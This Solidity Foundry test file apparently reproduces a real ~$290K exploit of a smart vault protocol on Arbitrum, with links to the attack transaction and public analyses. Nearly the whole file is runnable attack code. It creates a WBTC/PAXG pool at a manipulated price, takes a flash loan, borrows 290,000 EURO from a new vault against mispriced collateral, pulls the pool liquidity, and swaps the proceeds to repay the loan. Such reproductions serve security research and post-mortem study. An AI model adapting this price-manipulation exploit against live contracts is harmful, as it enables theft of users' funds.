// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$290K
// Attacker : https://arbiscan.io/address/0x09ed480feaf4cbc363481717e04e2c394ab326b4
// Attack Contract : https://arbiscan.io/address/0xb589d4a36ef8766d44c9785131413a049d51dbc0
// Vuln Contract : https://arbiscan.io/address/0x29046f8f9e7623a6a21cc8c3cc2a2121ae855b8d
// Attack Tx : https://explorer.phalcon.xyz/tx/arbitrum/0x51293c1155a1d33d8fc9389721362044c3a67e0ac732b3a6ec7661d47b03df9f

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1721807569222549518
// https://twitter.com/CertiKAlert/status/1721839125836321195

interface NonfungiblePositionManager {
    struct CollectParams {
        uint256 tokenId;
        address recipient;
        uint128 amount0Max;
        uint128 amount1Max;
    }

    struct DecreaseLiquidityParams {
        uint256 tokenId;
        uint128 liquidity;
        uint256 amount0Min;
        uint256 amount1Min;
        uint256 deadline;
    }

    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }
}

interface IPositionsNFT is IPoolInitializer {
    function collect(NonfungiblePositionManager.CollectParams memory params)
        external
        payable
        returns (uint256 amount0, uint256 amount1);

    function decreaseLiquidity(NonfungiblePositionManager.DecreaseLiquidityParams memory params)
        external
        payable
        returns (uint256 amount0, uint256 amount1);

    function mint(NonfungiblePositionManager.MintParams memory params)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
}

interface ISmartVaultManagerV2 {
    function mint() external returns (address vault, uint256 tokenId);
}

interface ISmartVaultV2 {
    function mint(address _to, uint256 _amount) external;

    function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external;
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 limitSqrtPrice;
    }
}

interface ICamelotRouter {
    function exactInputSingle(ISwapRouter.ExactInputSingleParams memory params)
        external
        payable
        returns (uint256 amountOut);
}

contract ContractTest is Test {
    IPositionsNFT private constant PositionsNFT = IPositionsNFT(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IERC20 private constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 private constant PAXG = IERC20(0xfEb4DfC8C4Cf7Ed305bb08065D08eC6ee6728429);
    IERC20 private constant EURO = IERC20(0x643b34980E635719C15a2D4ce69571a258F940E9);
    IWETH private constant WETH = IWETH(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
    IUSDC private constant USDC = IUSDC(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    Uni_Pair_V3 private constant WBTC_WETH = Uni_Pair_V3(0x2f5e87C9312fa29aed5c179E456625D79015299c);
    ISmartVaultManagerV2 private constant SmartVaultManagerV2 =
        ISmartVaultManagerV2(0xba169cceCCF7aC51dA223e04654Cf16ef41A68CC);
    ICamelotRouter private constant RouterV3 = ICamelotRouter(0x1F721E2E82F6676FCE4eA07A5958cF098D339e18);
    Uni_Router_V3 private constant Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    ISmartVaultV2 private SmartVaultV2;

    function setUp() public {
        vm.createSelectFork("arbitrum", 147_817_765);
        vm.label(address(PositionsNFT), "PositionsNFT");
        vm.label(address(WBTC), "WBTC");
        vm.label(address(PAXG), "PAXG");
        vm.label(address(EURO), "EURO");
        vm.label(address(USDC), "USDC");
    }

    function testExploit() public {
        // Attacker sent PAXG amount to exploit contract before attack
        deal(address(PAXG), address(this), 100e9);

        emit log_named_decimal_uint("Attacker USDC balance before exploit", USDC.balanceOf(address(this)), 6);

        emit log_named_decimal_uint("Attacker EURO balance before exploit", EURO.balanceOf(address(this)), 18);

        address pool = PositionsNFT.createAndInitializePoolIfNecessary(
            address(WBTC), address(PAXG), 3000, uint160(address(0x186a0000000000000000000000000))
        );

        WBTC_WETH.flash(address(this), 1_000_000_010, 0, bytes(""));

        emit log_named_decimal_uint("Attacker USDC balance after exploit", USDC.balanceOf(address(this)), 6);

        emit log_named_decimal_uint("Attacker EURO balance after exploit", EURO.balanceOf(address(this)), 18);
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        (address smartVault,) = SmartVaultManagerV2.mint();
        SmartVaultV2 = ISmartVaultV2(smartVault);

        WBTC.transfer(smartVault, WBTC.balanceOf(address(this)) - 10);
        SmartVaultV2.mint(address(this), 290_000 * 1e18);

        WBTC.approve(address(PositionsNFT), 10);
        PAXG.approve(address(PositionsNFT), 100e9);
        (uint256 tokenId, uint128 liquidity) = mintWBTC_PAXG();

        // Swap in the pool (WBTC/PAXG), which was manipulated through the sole position the attacker had opened before.
        SmartVaultV2.swap(bytes32(hex"57425443"), bytes32(hex"50415847"), 1e9);
        decreaseLiquidityInPool(tokenId, liquidity);
        collectWBTC_PAXG(tokenId);

        EURO.approve(address(RouterV3), 10_000 * 1e18);
        EUROToUSDC();
        USDC.approve(address(Router), type(uint256).max);
        USDCToWBTC(uint24(fee0));
        WBTC.transfer(address(WBTC_WETH), WBTC.balanceOf(address(this)));
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function mintWBTC_PAXG() internal returns (uint256 tokenId, uint128 liquidity) {
        NonfungiblePositionManager.MintParams memory params = NonfungiblePositionManager.MintParams({
            token0: address(WBTC),
            token1: address(PAXG),
            fee: 3000,
            tickLower: -887_220,
            tickUpper: 887_220,
            amount0Desired: 10,
            amount1Desired: 100e9,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp
        });

        (tokenId, liquidity,,) = PositionsNFT.mint(params);
    }

    function decreaseLiquidityInPool(uint256 _tokenId, uint128 _liqudity) internal {
        NonfungiblePositionManager.DecreaseLiquidityParams memory params = NonfungiblePositionManager
            .DecreaseLiquidityParams({
            tokenId: _tokenId,
            liquidity: _liqudity,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp
        });
        PositionsNFT.decreaseLiquidity(params);
    }

    function collectWBTC_PAXG(uint256 _tokenId) internal {
        NonfungiblePositionManager.CollectParams memory params = NonfungiblePositionManager.CollectParams({
            tokenId: _tokenId,
            recipient: address(this),
            amount0Max: type(uint128).max,
            amount1Max: type(uint128).max
        });
        PositionsNFT.collect(params);
    }

    function EUROToUSDC() internal {
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(EURO),
            tokenOut: address(USDC),
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: 10_000 * 1e18,
            amountOutMinimum: 0,
            limitSqrtPrice: 0
        });
        RouterV3.exactInputSingle(params);
    }

    function USDCToWBTC(uint24 _fee) internal {
        Uni_Router_V3.ExactOutputSingleParams memory params = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(WBTC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: 1_000_000_010 + _fee - WBTC.balanceOf(address(this)),
            amountInMaximum: type(uint256).max,
            sqrtPriceLimitX96: 0
        });

        Router.exactOutputSingle(params);
    }
}
